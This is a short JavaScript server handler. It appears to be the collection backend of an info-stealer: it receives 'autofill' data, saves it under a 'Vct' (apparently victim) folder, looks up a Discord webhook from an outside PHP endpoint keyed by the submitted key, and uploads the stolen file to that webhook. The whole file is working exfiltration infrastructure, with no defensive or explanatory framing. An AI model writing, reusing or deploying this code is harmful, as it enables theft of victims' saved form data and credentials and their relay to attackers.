const fs = require('fs').promises;
const { WebhookClient } = require('discord.js');
const crypto = require('crypto');
const axios = require('axios');

module.exports = async (req, res) => {
    const { key, autofill } = req.body;
const payload = {
  key: key, // Assuming key is defined elsewhere in your code
  // Other payload data if needed
};
    if (!key) return res.sendStatus(400);

    try {
		const response = await axios.post('http://redrose5.liveblog365.com/keysorgu/keysorgu.php', payload);

  const webhook = response.data;

        if (!webhook) return res.sendStatus(400);

        const randomstringg = crypto.randomBytes(4).toString('hex');
        const content = autofill;

        await fs.writeFile(`./Vct/autofill/${randomstringg}.txt`, content);

        const webhookClient = new WebhookClient({ url: webhook });
        await webhookClient.send({
            files: [{
                attachment: `./Vct/autofill/${randomstringg}.txt`,
                name: `${randomstringg}autofill.txt`
            }]
        });

		
        return res.sendStatus(200);
    } catch (err) {
       
        return res.status(500).json({ error: 'Internal Server Error' });
    }
};
